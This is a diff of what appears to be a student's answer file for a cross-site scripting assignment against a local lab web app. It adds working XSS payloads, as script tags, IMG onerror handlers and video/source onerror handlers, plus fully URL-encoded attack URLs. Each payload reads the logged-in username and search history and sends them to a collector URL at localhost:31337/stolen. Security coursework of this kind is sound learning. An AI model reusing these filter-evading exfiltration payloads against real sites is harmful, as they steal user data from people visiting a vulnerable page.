@@ -16,17 +16,14 @@ Part 1: Cross-site Scripting (35%)
 
 	1.0) Payload (JavaScript/jQuery):
 
-
-		http://localhost:31337/stolen?user=USERNAME&last_search=LAST_SEARCH
-
-
 		<script>
 			window.onload = function(){ 
 				var username = document.getElementById('logged-in-user').innerHTML;
 				var last_search = document.getElementsByClassName("history-item")[1].innerHTML;
 				var theUrl = "http://localhost:31337/stolen?user=" + username + "&last_search=" + last_search;
-				var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", theUrl, false );
-			
+				var xmlHttp = new XMLHttpRequest();
+				xmlHttp.open( "GET", theUrl, true );
+				xmlHttp.send(null);
 			};
 		</script>
 
@@ -35,52 +32,67 @@ Part 1: Cross-site Scripting (35%)
 
 		http://0.0.0.0:8080/search?xssdefense=0&q=TODO
 
-		http://0.0.0.0:8080/search?xssdefense=0&q=<script>window.onload = function(){ var username = document.getElementById('logged-in-user').innerHTML;var last_search = document.getElementsByClassName("history-item")[1].innerHTML;var theUrl = "http://localhost:31337/stolen?user=" + username + "&last_search=" + last_search;var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", theUrl, false );};</script>
+		http://0.0.0.0:8080/search?q=%09%09%3Cscript%3E+%09%09%09window.onload+%3D+function%28%29%7B++%09%09%09%09var+username+%3D+document.getElementById%28%27logged-in-user%27%29.innerHTML%3B+%09%09%09%09var+last_search+%3D+document.getElementsByClassName%28%22history-item%22%29%5B1%5D.innerHTML%3B+%09%09%09%09var+theUrl+%3D+%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22+%2B+username+%2B+%22%26last_search%3D%22+%2B+last_search%3B+%09%09%09%09var+xmlHttp+%3D+new+XMLHttpRequest%28%29%3B+%09%09%09%09xmlHttp.open%28+%22GET%22%2C+theUrl%2C+true+%29%3B+%09%09%09%09xmlHttp.send%28null%29%3B+%09%09%09%7D%3B+%09%09%3C%2Fscript%3E
 
-		
 
 	1.1) Remove "script"
 
-		window.onload = function(){ var username = document.getElementById('logged-in-user').innerHTML;var last_search = document.getElementsByClassName("history-item")[1].innerHTML;var theUrl = "http://localhost:31337/stolen?user=" + username + "&last_search=" + last_search;var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", theUrl, false );};alert(theUrl);
 
-
-		http://0.0.0.0:8080/search?xssdefense=1&q=TODO
-
-
-		Another example:
-		<p> <a href="" onload="alert('I excuted JavaScript!');">Click me to see the JavaScript work!</a> </p>
-
-
-
-
-		var username = document.getElementById('logged-in-user').innerHTML;
-		alert(last_search);
-
-		<IMG SRC=/ onerror="
-		window.onload = function(){ 
-			var last_search = document.getElementsByClassName("history-item")[1].innerHTML;
-			
-		};
+		Payload:
+		<IMG SRC="" onerror="
+			window.onload = function(){ 
+				var username = document.getElementById('logged-in-user').innerHTML;
+				var last_search = document.getElementsByClassName('history-item')[1].innerHTML;
+				var theUrl = 'http://localhost:31337/stolen?user=' + username + ' &last_search=' + last_search;
+				var xmlHttp = new XMLHttpRequest();
+				xmlHttp.open( 'GET', theUrl, true );
+				xmlHttp.send(null);
+			};
 		"></img>
-		https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+
+		The URL:
+		http://0.0.0.0:8080/search?xssdefense=1&q=%09%09%3CIMG+SRC%3D%22%22+onerror%3D%22+%09%09%09window.onload+%3D+function%28%29%7B++%09%09%09%09var+username+%3D+document.getElementById%28%27logged-in-user%27%29.innerHTML%3B+%09%09%09%09var+last_search+%3D+document.getElementsByClassName%28%27history-item%27%29%5B1%5D.innerHTML%3B+%09%09%09%09var+theUrl+%3D+%27http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%27+%2B+username+%2B+%27+%26last_search%3D%27+%2B+last_search%3B+%09%09%09%09var+xmlHttp+%3D+new+XMLHttpRequest%28%29%3B+%09%09%09%09xmlHttp.open%28+%27GET%27%2C+theUrl%2C+true+%29%3B+%09%09%09%09xmlHttp.send%28null%29%3B+%09%09%09%7D%3B+%09%09%22%3E%3C%2Fimg%3E
+
+		
+
 
 	1.2) Remove several tags 
 
 		http://0.0.0.0:8080/search?xssdefense=2&q=TODO
 
-		http://0.0.0.0:8080/search?q=%3Ciframe+src%3D%22https%3A%2F%2Fbongo.cat%2F%22%3E
-		<iframe src="https://bongo.cat/">
 
-		http://0.0.0.0:8080/search?q=%3Ctable+background%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E
-		<table background="javascript:alert('XSS')">
+		Payload:
+
+		<video><source onerror="
+			window.onload = function(){ 
+				var username = document.getElementById('logged-in-user').innerHTML;
+				var last_search = document.getElementsByClassName('history-item')[1].innerHTML;
+				var theUrl = 'http://localhost:31337/stolen?user=' + username + ' &last_search=' + last_search;
+				var xmlHttp = new XMLHttpRequest();
+				xmlHttp.open( 'GET', theUrl, true );
+				xmlHttp.send(null);
+			};
+		">
+
+		The URL:
+
+		http://0.0.0.0:8080/search?xssdefense=2&q=%09%09%3Cvideo%3E%3Csource+onerror%3D%22+%09%09+%09%09%09window.onload+%3D+function%28%29%7B++%09%09%09%09var+username+%3D+document.getElementById%28%27logged-in-user%27%29.innerHTML%3B+%09%09%09%09var+last_search+%3D+document.getElementsByClassName%28%27history-item%27%29%5B1%5D.innerHTML%3B+%09%09%09%09var+theUrl+%3D+%27http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%27+%2B+username+%2B+%27+%26last_search%3D%27+%2B+last_search%3B+%09%09%09%09var+xmlHttp+%3D+new+XMLHttpRequest%28%29%3B+%09%09%09%09xmlHttp.open%28+%27GET%27%2C+theUrl%2C+true+%29%3B+%09%09%09%09xmlHttp.send%28null%29%3B+%09%09%09%7D%3B+%09%09+%09%09+%09%09%22%3E
 
 
 	1.3) Remove " ' and ;
 
 		http://0.0.0.0:8080/search?xssdefense=3&q=TODO
 
-		http://0.0.0.0:8080/search?q=%3Ciframe+SRC%3DJaVaScRiPt%3Aalert%28%29%3E
-		<iframe SRC=JaVaScRiPt:alert()>
+		Payload:
+
+
+
+
+		theUrl:
+		
+		
+
+	
 
 		http://0.0.0.0:8080/search?q=%3CA+HREF%3Dhttp%3A%2F%2Fgoogle.com%2F%3Elink%3C%2FA%3E
 		<A HREF=http://google.com/>link</A>
@@ -172,7 +184,8 @@ Additional Questions
 		https://www.veracode.com/security/xss
 		https://www.codegrepper.com/code-examples/javascript/xss+attack+without+script+tag
 		https://www.acunetix.com/websitesecurity/cross-site-scripting/
-
+		https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+		https://html5sec.org/
 
 	Q3 (optional, ungraded). Do you have any suggestions for improving this assignment in the future?
 
